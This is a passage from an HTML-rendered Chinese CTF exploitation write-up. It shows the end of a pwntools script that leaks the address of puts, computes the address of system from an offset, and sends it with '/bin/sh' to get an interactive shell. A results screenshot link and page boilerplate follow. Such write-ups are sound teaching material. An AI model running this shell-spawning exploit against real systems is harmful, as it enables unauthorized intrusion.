color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; font-weight:normal; text-transform:none">print "puts\_addr: "+hex(puts\_addr)</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="background-color:#ffffff; color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; font-weight:normal; text-transform:none">system\_addr = puts\_addr+off</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="background-color:#ffffff; color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; font-weight:normal; text-transform:none">print "system\_addr: "+hex(system\_addr)</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; text-transform:none">&#xa0;</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="background-color:#ffffff; color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; font-weight:normal; text-transform:none">s.sendline(p64(system\_addr)+"/bin/sh\x00")</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="background-color:#ffffff; color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; font-weight:normal; text-transform:none">s.interactive()</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; text-transform:none">&#xa0;</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="background-color:#ffffff; color:#333333; font-family:宋体; font-size:10.5pt; font-style:normal; font-weight:normal; text-transform:none">运行结果如下 为了方便没有显示调试信息</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0">![](https://i.imgur.com/aVYERT3.png)</p></div><div class="cnzz" style="display: none;">
	        <script src="http://s95.cnzz.com/stat.php?id=1253551100&web_id=1253551100" language="JavaScript"></script>
            </div>
            <div class="docpe" style="position: absolute;color: white;margin-left:-450;">
            <a target="_blank" href="http://www.docpe.com">档铺网——在线文档免费处理</a>
            </div>
            </body></html>